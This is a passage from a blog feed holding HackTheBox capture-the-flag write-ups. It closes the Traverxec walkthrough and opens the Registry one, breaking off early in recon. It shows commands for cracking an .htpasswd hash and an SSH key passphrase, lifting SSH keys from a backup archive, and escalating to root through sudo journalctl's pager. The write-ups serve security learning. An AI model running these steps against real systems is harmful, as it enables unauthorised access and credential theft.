flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ ls -la /home/</span><br><span class="line">drwx--x--x  6 david david 4096 Nov 19 05:28 david</span><br><span class="line">www-data@traverxec:/$ ls -la /home/david/</span><br><span class="line">ls: cannot open directory <span class="string">'/home/david/'</span>: Permission denied</span><br></pre></td></tr></table></figure><p>The user is <code>david</code> but unfortunately we have no rights to read or write files in his home directory. Let’s move on, we might find additional informations later.  </p><h3 id="Pivot-www-data-gt-david"><a href="#Pivot-www-data-gt-david" class="headerlink" title="Pivot www-data -&gt; david"></a>Pivot www-data -&gt; david</h3><p>Looking around we find the configuration of the <code>nostromo</code> web server, hopefully we can find juicy informations there ?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ cat /var/nostromo/conf/nhttpd.conf</span><br><span class="line"><span class="comment"># MAIN [MANDATORY]</span></span><br><span class="line">servername        traverxec.htb</span><br><span class="line">serverlisten        *</span><br><span class="line">serveradmin        david@traverxec.htb</span><br><span class="line">serverroot        /var/nostromo</span><br><span class="line">servermimes        conf/mimes</span><br><span class="line">docroot            /var/nostromo/htdocs</span><br><span class="line">docindex        index.html</span><br><span class="line"><span class="comment"># LOGS [OPTIONAL]</span></span><br><span class="line">logpid            logs/nhttpd.pid</span><br><span class="line"><span class="comment"># SETUID [RECOMMENDED]</span></span><br><span class="line">user            www-data</span><br><span class="line"><span class="comment"># BASIC AUTHENTICATION [OPTIONAL]</span></span><br><span class="line">htaccess        .htaccess</span><br><span class="line">htpasswd        /var/nostromo/conf/.htpasswd</span><br><span class="line"><span class="comment"># ALIASES [OPTIONAL]</span></span><br><span class="line">/icons            /var/nostromo/icons</span><br><span class="line"><span class="comment"># HOMEDIRS [OPTIONAL]</span></span><br><span class="line">homedirs        /home</span><br><span class="line">homedirs_public        public_www</span><br></pre></td></tr></table></figure><p>The configuration gives the path to an <code>.htpasswd</code> file :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ cat /var/nostromo/conf/.htpasswd</span><br><span class="line">david:<span class="variable">$1</span><span class="variable">$e7NfNpNi</span><span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/</span><br></pre></td></tr></table></figure><p>Maybe if we brute-force the password of this <code>.htpasswd</code> file we can reuse the found password to login as <code>david</code> to ssh. Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"<span class="variable">$1</span><span class="variable">$e7NfNpNi</span><span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/"</span> &gt; david.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt david.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (md5crypt, crypt(3) <span class="variable">$1</span>$ (and variants) [MD5 128/128 AVX 4x3])</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Nowonly4me       (?)</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Alright! We managed to get the password. That’s a good news and a nice step. Let’s try to login as <code>david</code> now:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh david@traverxec.htb</span><br><span class="line">david@traverxec.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br></pre></td></tr></table></figure><p>No luck… <code>su - david</code> maybe ?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ su - david</span><br><span class="line">Password:</span><br><span class="line">su: Authentication failure</span><br><span class="line">www-data@traverxec:/$</span><br></pre></td></tr></table></figure><p>Nop! Looks like a dead end here… Let’s go back at the beginning to make sure we didn’t miss anything. </p><p>First let’s check again the <code>nhttpd.conf</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf</span><br><span class="line">[...]</span><br><span class="line"><span class="comment"># HOMEDIRS [OPTIONAL]</span></span><br><span class="line">homedirs        /home</span><br><span class="line">homedirs_public        public_www</span><br></pre></td></tr></table></figure><p>This <code>HOMEDIRS</code> option catch my eye, does that mean we could access <code>david</code> home directory using the web-server ? Let’s check the documentation:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ man nhttpd</span><br><span class="line">HOMEDIRS</span><br><span class="line">To serve the home directories of your users via HTTP, <span class="built_in">enable</span> the homedirs option by defining the path <span class="keyword">in</span> <span class="built_in">where</span> the home directories are stored, normally /home. To access a users home directory enter a ~ <span class="keyword">in</span> the URL followed by the home directory name like <span class="keyword">in</span> this example:</span><br><span class="line">http://www.nazgul.ch/~hacki/</span><br><span class="line">The content of the home directory is handled exactly the same way as a directory <span class="keyword">in</span> your document root. If some users don<span class="string">'t want that their home directory can be accessed via HTTP, they shall remove the world readable flag on their home directory and a caller will receive a 403 Forbidden response. Also, if basic authentication is enabled, a user can create an .htaccess file in his home directory and a caller will need to authenticate.</span></span><br><span class="line"><span class="string">You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public option.</span></span><br></pre></td></tr></table></figure><p>Thats interesting!<br>Ok so we know our user is David, can we access his homedir?</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://traverxec.htb/\~david/</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;&lt;font style="sans-serif"&gt;</span><br><span class="line">&lt;h1&gt;Private space.&lt;br&gt;Nothing here.</span><br><span class="line">&lt;br&gt;Keep out!&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>“Nothing to see here”… That’s true, and running <code>gobuster</code> won’t help either. We need to find a way to list files and directories in <code>david</code> homedir, but how ? And this is where I got frustrated… After searching for a while I realized I overlooked something obvious. Let’s check again the permissions of <code>david</code> homedir:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ ls -l /home/david/</span><br><span class="line">ls: cannot open directory <span class="string">'/home/david'</span>: Permission denied</span><br><span class="line">www-data@traverxec:/$ ls -l /home/</span><br><span class="line">total 4</span><br><span class="line">drwx--x--x 5 david david 4096 Dec 22 12:15 david</span><br></pre></td></tr></table></figure><p>We indeed have no read nor write permissions, but we do have execute bit is set (<code>x</code>).   </p><p>For a binary the <code>x</code> bit mean the file can be executed. But for directory, what does it mean then ? </p><blockquote><p>The execute bit (<code>x</code>) allows the affected user to enter the directory, and access files and directories inside.</p></blockquote><p>So we can not read nor write <code>david</code> homedir but we can enter it! Let’s give a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ <span class="built_in">cd</span> /home/david/public_www/</span><br><span class="line"><span class="built_in">cd</span> /home/david/public_www/</span><br><span class="line">www-data@traverxec:/home/david/public_www$ ls -l</span><br><span class="line">ls -l</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html</span><br><span class="line">drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area</span><br></pre></td></tr></table></figure><p>It worked! Once inside we notice another interesting folder: <code>protected-file-area</code>. Let’s see what’s it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ ls</span><br><span class="line">backup-ssh-identity-files.tgz</span><br></pre></td></tr></table></figure><p>A backup of ssh identity files ? This sure looks promising. Let’s extract it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ mkdir /tmp/.tmp</span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ tar -xzf backup-ssh-identity-files.tgz -C /tmp/.tmp</span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ <span class="built_in">cd</span> /tmp/.tmp/home/david/</span><br><span class="line">www-data@traverxec:/tmp/tmp/home/david$ ls -la .ssh/</span><br><span class="line">-rw-r--r-- 1 www-data www-data  397 Oct 25 17:02 authorized_keys</span><br><span class="line">-rw------- 1 www-data www-data 1766 Oct 25 17:02 id_rsa</span><br><span class="line">-rw-r--r-- 1 www-data www-data  397 Oct 25 17:02 id_rsa.pub</span><br></pre></td></tr></table></figure><p>Jackpot! We can now try to use this ssh key to access <code>david</code> account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa david@traverxec.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa'</span>:</span><br></pre></td></tr></table></figure><p>It couldn’t have been this easy right? A passphrase is needed for this ssh key. Let’s fire <code>john</code> to see if we can brute-force the passphrase:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh2john id_rsa &gt; id_rsa.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">hunter           (ssh/id_rsa)</span><br><span class="line">Warning: Only 1 candidate left, minimum 2 needed <span class="keyword">for</span> performance.</span><br><span class="line">1g 0:00:00:12 DONE (2019-11-18 11:06) 0.08012g/s 1149Kp/s 1149Kc/s 1149KC/s *7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p><code>john</code> found <code>hunter</code> as a passphrase. We have all the pieces to login now:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa david@traverxec.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa'</span>:</span><br><span class="line">Linux traverxec 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span></span><br><span class="line">david@traverxec:~$ cat user.txt</span><br><span class="line">7xxxxxxxxxxxxxxxxxxxxxd</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>First thing first, let’s check what’s inside <code>david</code> home directory:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~$ ls -l</span><br><span class="line">total 12</span><br><span class="line">drwx------ 2 david david 4096 Dec 22 12:41  bin</span><br><span class="line">drwxr-xr-x 3 david david 4096 Oct 25 15:45  public_www</span><br><span class="line">-r--r----- 1 root  david   33 Oct 25 16:14  user.txt</span><br><span class="line">david@traverxec:~$ ls -l bin</span><br><span class="line">total 8</span><br><span class="line">-r-------- 1 david david 802 Oct 25 16:26 server-stats.head</span><br><span class="line">-rwx------ 1 david david 363 Oct 25 16:26 server-stats.sh</span><br></pre></td></tr></table></figure><p>Let’s first focus on the <code>bin</code> folder and <code>server-stats.sh</code> script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~/bin$ cat server-stats.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">cat /home/david/bin/server-stats.head</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Load: `/usr/bin/uptime`"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">" "</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">" "</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Last 5 journal log lines:"</span></span><br><span class="line">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat</span><br></pre></td></tr></table></figure><p>The line about <code>journalctl</code> looks particularly interesting since it’s used with <code>sudo</code> command without password. If we can abuse this <code>journalctl</code> command we can potentially escalate our privileges to root. </p><p>The best resource for finding example of abusing legitimate binaries is <a href="https://gtfobins.github.io/" target="_blank" rel="noopener"><code>GTFOBins</code></a>:</p><blockquote><p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p><p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or  maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p></blockquote><p>According to it, <code>journalctl</code> can be used to elevate privileges thanks to the pager used (<code>less</code>): </p><blockquote><p><code>Less</code> can be used to break out from restricted environments by spawning an interactive system shell.</p></blockquote><p>Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span><br><span class="line">-- Logs begin at Mon 2019-11-18 07:00:54 EST, end at Mon 2019-11-18</span><br><span class="line">Nov 18 07:00:58 traverxec systemd[1]: Starting nostromo nhttpd serv</span><br><span class="line">Nov 18 07:00:58 traverxec systemd[1]: nostromo.service: Can<span class="string">'t open</span></span><br><span class="line"><span class="string">Nov 18 07:00:58 traverxec nhttpd[477]: started</span></span><br><span class="line"><span class="string">Nov 18 07:00:58 traverxec nhttpd[477]: max. file descriptors = 1040</span></span><br><span class="line"><span class="string">Nov 18 07:00:58 traverxec systemd[1]: Started nostromo nhttpd serve</span></span><br><span class="line"><span class="string">!/bin/sh</span></span><br><span class="line"><span class="string"># bash</span></span><br><span class="line"><span class="string">root@traverxec:/home/david/bin# cd</span></span><br><span class="line"><span class="string">root@traverxec:~# ls</span></span><br><span class="line"><span class="string">nostromo_1.9.6-1.deb  root.txt</span></span><br><span class="line"><span class="string">root@traverxec:~# cat root.txt</span></span><br><span class="line"><span class="string">9xxxxxxxxxxxxxxxxx6</span></span><br></pre></td></tr></table></figure><p>Now that we are root and done let’s not forget to clean up our changes to not spoil other users!</p><h2 id="Additional-notes"><a href="#Additional-notes" class="headerlink" title="Additional notes"></a>Additional notes</h2><p>I will put here a few additional information about this box that could be useful to others.</p><h3 id="htpassw-bruteforce"><a href="#htpassw-bruteforce" class="headerlink" title=".htpassw bruteforce"></a>.htpassw bruteforce</h3><p>As you could have noticed in the user flag recon part, a <code>.htpasswd</code> if available, this one is used to restrict access to the <code>protected-file-area</code> folder in <code>david</code> homedir:</p><p><img src="https://user-images.githubusercontent.com/9076747/71325453-6e9f3c80-24ed-11ea-8507-3c758091d65c.png" alt="basic auth traverxec"></p><p>It was possible to brute-force this <code>.htpasswd</code> file even if it was not needed to solve the box. Here how to do it using the good old <code>john</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ cat /var/nostromo/conf/.htpasswd</span><br><span class="line">david:<span class="variable">$1</span><span class="variable">$e7NfNpNi</span><span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"david:<span class="variable">$1</span><span class="variable">$e7NfNpNi</span><span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/"</span> &gt; david.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt david.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (md5crypt, crypt(3) <span class="variable">$1</span>$ (and variants) [MD5 128/128 AVX 4x3])</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Nowonly4me       (?)</span><br><span class="line">1g 0:00:01:35 DONE (2019-11-17 19:28) 0.01052g/s 111325p/s 111325c/s 111325C/s Noyoo..NovemberRain</span><br><span class="line">Session completed</span><br><span class="line">[hg8@archbook ~]$ john --show david.hash</span><br><span class="line">david:Nowonly4me</span><br></pre></td></tr></table></figure><p>Let’s now try to access the <code>protected-file-area</code> using those credentials:</p><p><img src="https://user-images.githubusercontent.com/9076747/71325488-f4bb8300-24ed-11ea-9885-e4ef90f7d370.png" alt="david homedir htaccess"></p><p>Success!</p><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> john </tag>
            
            <tag> traverxec </tag>
            
            <tag> nhttpd </tag>
            
            <tag> nostromo </tag>
            
            <tag> Directory Transversal </tag>
            
            <tag> CVE-2019-16278 </tag>
            
            <tag> journalctl </tag>
            
            <tag> less </tag>
            
            <tag> GTFOBins </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Registry</title>
      <link href="/posts/registry/"/>
      <url>/posts/registry/</url>
      
        <content type="html"><![CDATA[<img width="586" alt="registry-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158642-6e7f4f00-9889-11ea-914c-557127a898c6.png"><p>Registry was my first hard box, this box was pretty interesting with real-life scenario like I love. This box shows the importance of understanding how things works “behind the scene” and to read all documentations carefully to not miss anything. I recommend this box for people  who finished few medium difficulty boxes and wants to level-up.</p><p><strong>Tl;Dr:</strong> The user flag consisted in finding an <code>INSTALL</code> archive containing install instruction and certificate to deploy an online docker registry, this certificate was used on the docker registry running on the box. Using this cert we could connect to the registry API and pull the docker image available on it. Running the docker image locally and doing recon into it allows to find an SSH key along with its passphrase. This key would allow to connect to the <code>bolt</code> user account and grab the user flag.<br>The root flag required to access a CMS after brute-forcing the admin password found in a sqlite database. From the CMS we pivot from the <code>bolt</code> user to <code>www-data</code> user by exploiting insecure file upload vulnerability. From <code>www-data</code> a backup software - restic - can be run as sudo without password. Using this software we are able to backup the whole <code>/root/</code> folder and restore its content with read privileges for <code>www-data</code> including the <code>root.txt</code> flag and a <code>.ssh/id_rsa</code> key allowing us to get a full shell as root.   </p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.171 registry.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC registry.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-27 10:58 CET</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http     nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">| ssl-cert: Subject: commonName=docker.registry.htb</span><br><span class="line">| Not valid before: 2019-05-06T21:14:35</span><br><span class="line">|_Not valid after:  2029-05-03T21:14:35</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>Port <code>80</code>, <code>443</code> and <code>22</code> are open. </p><p>One interesting point, the SSL certificate have <code>docker.registry.htb</code> as <code>common Name</code>. Let’s add it to our host file as it can be useful later:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.159 docker.registry.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Opening <code>http://regirstry.htb</code> display the default nginx page:</p><p><img src="https://user-images.githubusercontent.com/9076747/73365373-756b5d00-42ac-11ea-8134-e63c52f73b34.png" alt="default nginx page"></p><p>While <code>http://docker.registry.htb</code> return empty response:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i http://docker.registry.htb/</span><br><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx/1.14.0 (Ubuntu)</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span>: max-age=63072000; includeSubdomains</span><br><span class="line"><span class="attribute">X-Frame-Options</span>: DENY</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span>: nosniff</span><br></pre></td></tr></table></figure><p>That’s not much informations here… Let’s run <code>gobuster</code> to see if we can find more interesting stuff:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">"https://registry.htb/"</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php -k </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.bash_history (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/install (Status: 301)</span><br><span class="line">/backup.php</span><br><span class="line">===============================================================</span><br><span class="line">2020/01/29 15:43:58 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>The backup endpoint must be used as a script to do…well…backups.  It doesn’t return anything either:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i registry.htb/backup.php                            </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Date: Fri, 07 Feb 2020 14:33:30 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Strict-Transport-Security: max-age=63072000; includeSubdomains</span><br><span class="line">X-Frame-Options: DENY</span><br><span class="line">X-Content-Type-Options: nosniff</span><br></pre></td></tr></table></figure><p>Next, opening the <code>install</code> endpoint shows some garbage:</p><p><img src="https://user-images.githubusercontent.com/9076747/73366783-ced48b80-42ae-11ea-8ad0-3583a3cacacf.png" alt="install file garbage"></p><p>Since we don’t have other endpoint so far let’s investigate a bit more on this last one. First let’s download this page to file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget http://registry.htb/install</span><br><span class="line">Saving to: ‘install’</span><br><span class="line">2020-01-29 15:54:07 (53.3 MB/s) - ‘install’ saved [1050]</span><br><span class="line">[hg8@archbook ~]$ file install</span><br><span class="line">install: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size modulo 2^32 167772200 gzip compressed data, reserved method, has CRC, was <span class="string">""</span>, from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 167772200</span><br></pre></td></tr></table></figure><p>That’s interesting, the <code>file</code> utility indicate that the <code>install</code> file is a <code>gzip</code> archive. Let’s try to extract it. Out of habit I used <code>tar</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ tar -xzf install</span><br><span class="line"></span><br><span class="line">gzip: stdin: unexpected end of file</span><br><span class="line">tar: Child returned status 1</span><br><span class="line">tar: Error is not recoverable: exiting now</span><br></pre></td></tr></table></figure><p>Despite this bad looking error the files seems to have been extracted properly so that’s good:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ls -a</span><br><span class="line">.  ..  ca.crt  install  